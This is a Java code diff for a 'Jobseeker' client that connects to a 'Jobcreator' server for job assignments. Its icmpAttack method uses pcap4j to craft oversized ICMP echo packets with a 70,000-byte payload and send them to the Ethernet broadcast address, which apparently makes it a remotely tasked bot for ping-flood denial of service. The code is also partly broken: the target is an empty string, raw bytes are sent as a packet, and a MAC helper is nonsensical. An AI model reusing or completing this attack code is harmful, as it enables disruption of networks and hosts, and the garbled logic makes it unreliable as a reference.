@@ -8,10 +8,12 @@ import org.pcap4j.util.MacAddress;
 
 import java.io.*;
 import java.net.*;
-import java.util.concurrent.atomic.AtomicReference;
-//import java.util.Arrays;
+
+import java.nio.charset.StandardCharsets;
+
 
 public class Jobseeker{
+
 
 
     public static void main(String[] args) {
@@ -23,7 +25,7 @@ public class Jobseeker{
         try {
             Socket socket = new Socket(hostname, port);
             System.out.println("Connected to Jobcreator.");
-
+            //System.out.println("MacAddress:  "+macAddress(hostname));
             // Creating output stream to Jobcreator
             OutputStream out = socket.getOutputStream();
             toServer = new PrintWriter(out, true);
@@ -33,8 +35,10 @@ public class Jobseeker{
             BufferedReader reader = new BufferedReader(new InputStreamReader(input));
 
             while(true) {
+
                 // testing block .. beginning
-                icmpAttack("127.0.0.1");
+                String targetIP = "";
+                icmpAttack(targetIP);
                 //testing block .. end
                 // JOB ASSIGNMENTS
                 System.out.println("Waiting for job assignments...");
@@ -115,10 +119,11 @@ public class Jobseeker{
         return output;
     }
 
-    public static void icmpAttack(String target) throws UnknownHostException, SocketException {
+    public static void icmpAttack(String target) {
         PcapHandle handler;
-        PcapNetworkInterface device;
+        PcapNetworkInterface devices;
         PcapStat stat;
+
 
         byte[] data = new byte[70000];
         for(int i=0; i< data.length; i++){
@@ -126,17 +131,32 @@ public class Jobseeker{
         }
 
 
+
         try{
             InetAddress targetAddress = InetAddress.getByName(target);
             InetAddress localhost = InetAddress.getLocalHost();
             NetworkInterface ni = NetworkInterface.getByInetAddress(targetAddress);
+            NetworkInterface niLocal = NetworkInterface.getByInetAddress(localhost);
 
-            //
-            device = Pcaps.getDevByAddress(targetAddress);
-            System.out.println(device);
+//            byte[] mac = ni.getHardwareAddress();
+//            System.out.println("Mac length is: "+ ni.getHardwareAddress());
+            byte[] mac = niLocal.getHardwareAddress();
+            System.out.println("Garbage: "+mac.toString());
+            MacAddress sourceMac = MacAddress.getByAddress(niLocal.getHardwareAddress());
+            if(sourceMac != null)
+                System.out.println("Source Mac Address is(String): "+sourceMac.toString());
+            else
+                System.out.println("Source Mac Address is NULL");
+
+            devices = Pcaps.getDevByAddress(targetAddress);
+            System.out.println(devices);
+            System.out.println("Local: "+niLocal.getDisplayName());
+
             System.out.println("Before Handler");
-            handler = device.openLive(65570, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 60);
+            handler = devices.openLive(65570, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 60);
             stat = handler.getStats();
+            System.out.println("Before Handler SendPacket");
+            System.out.println("\nReceiving Packets\n");
             PacketListener packetlistener = new PacketListener() {
                 @Override
                 public void gotPacket(PcapPacket pcapPacket) {
@@ -145,8 +165,6 @@ public class Jobseeker{
                     System.out.println(pcapPacket);
                 }
             };
-            handler.loop(40, packetlistener);
-            System.out.println("Before Handler SendPacket");
 
             IcmpV4EchoPacket.Builder echoPacket = new IcmpV4EchoPacket.Builder();
             echoPacket.identifier((short) 1);
@@ -168,26 +186,42 @@ public class Jobseeker{
             ipV4Builder.payloadBuilder(echoIcmp);
             ipV4Builder.correctChecksumAtBuild(true);
             for (Packet.Builder builder : ipV4Builder.correctLengthAtBuild(true)) {
-                
+                System.out.println("****************");
+                System.out.println("Sending Echo request Packets");
+                System.out.println("****************");
+                handler.sendPacket(data);
             }
-            ;
 
             EthernetPacket.Builder ethernet = new EthernetPacket.Builder();
-            ethernet.dstAddr(MacAddress.getByAddress(ni.getHardwareAddress()));
-            ethernet.srcAddr(MacAddress.getByAddress(NetworkInterface.getByInetAddress(localhost).getHardwareAddress()));
+            ethernet.dstAddr(MacAddress.ETHER_BROADCAST_ADDRESS);
+            ethernet.srcAddr(sourceMac);
             ethernet.type(EtherType.IPV4);
             ethernet.paddingAtBuild(true);
 
             Packet packet = ethernet.build();
+            System.out.println("****************");
+            System.out.println("Sending Echo request Packets");
+            System.out.println("****************");
+
             handler.sendPacket(packet);
+            handler.loop(40, packetlistener);
+
             System.out.println(stat.getNumPacketsCaptured());
 
         }
         catch (Exception p){
             p.printStackTrace();
         }
-
-
     }
+
+    public static String macAddress(byte[] targetIP) {
+        String mac;
+
+        System.out.println("MacAddress: "+targetIP);
+        mac = new String(targetIP);
+        System.out.println("MacAddress: "+mac);
+        return mac;
+    }
+
 }
 
